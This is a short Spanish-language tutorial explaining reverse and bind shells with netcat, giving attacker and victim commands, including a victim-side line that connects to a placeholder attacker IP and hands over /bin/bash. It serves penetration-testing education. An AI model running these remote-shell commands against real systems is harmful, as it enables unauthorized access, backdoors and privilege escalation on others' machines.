# Reverse y Bind Shell con Netcat

En esta práctica abordaremos lo que es una **reverse Shell** y una **Bind Shell**, específicamente nos abocaremos a la shell reversa o Reverse Shell, el cual nos permite ejecutar comandos a un cliente remoto.

## Términos básicos

*   **Bind Shell**: Lo que hace es dejar un puerto a la escucha, y el atacante se conecta a él.
*   **Reverse Shell**: Es cuando la víctima se conecta al atacante.

> **Nota:** El uso de las Reverse Shell es el de ejecutar comandos de manera remota, y a partir de ello dejar una puerta trasera, obtener privilegios por medio de un escalamiento. Lo que veremos a continuación son algunas formas de obtener acceso a un equipo remoto. Muchas veces se recomienda más el uso de una Bind Shell que la Reverse shell, pero llega a ser un poco más complicado realizarlo debido a las reglas de firewall.

**Importante:** Necesitamos contar con **netcat** (comando `nc`) en ambos sistemas (atacante y víctima).

## Reverse Shell

Si lo ejecutamos sin la opción `-e` únicamente tenemos un canal de comunicación de punto a punto (un simple "chat"). Sin embargo, si deseamos tener una conexión que nos permita ejecutar comandos debemos de realizar lo siguiente:

*   **Atacante:**
    ```bash
    nc -lvp 4546
    ```
*   **Víctima:**
    ```bash
    nc -nv [IP_ATACANTE] 4546 -e /bin/bash
    ```

## Bind Shell

*   **Víctima:**
    ```bash
    nc -lvp 4546 -e /bin/bash
    ```
*   **Atacante:**
    ```bash
    nc -nv [IP_VICTIMA] 4546
    ```

> **Nota:** En tipo de shell sería la ruta concreta al ejecutable de la Shell del sistema. La cual podría ser zsh, bash, sh, cmd, etc. según el entorno que se esté trabajando. Por ejemplo:
> *   **Linux**: `/bin/bash`
> *   **Windows**: `cmd.exe`
> *   **Termux**: `$PREFIX/bin/bash`

Una Shell reverse también se puede obtener con otros servicios tales como **Perl**, **Python**, desde un fichero **PHP**, etc.

> **Nota:** NO memorices aprende practicando, que la genialidad es igual a la repetición.
